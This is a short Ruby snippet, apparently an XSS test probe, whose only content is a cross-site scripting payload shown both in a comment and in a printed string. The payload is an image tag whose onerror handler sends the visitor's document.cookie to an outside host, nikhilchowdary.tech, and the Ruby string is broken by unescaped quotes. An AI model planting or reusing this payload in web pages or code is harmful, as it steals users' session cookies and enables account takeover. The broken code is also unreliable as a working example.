def handler
  # <img src=x onerror="window.__CRXSS=1;new Image().src=`http://nikhilchowdary.tech/xss?c=${document.cookie}`">
  msg = "<img src=x onerror="window.__CRXSS=1;new Image().src=`http://nikhilchowdary.tech/xss?c=${document.cookie}`">"
  puts msg
end
handler
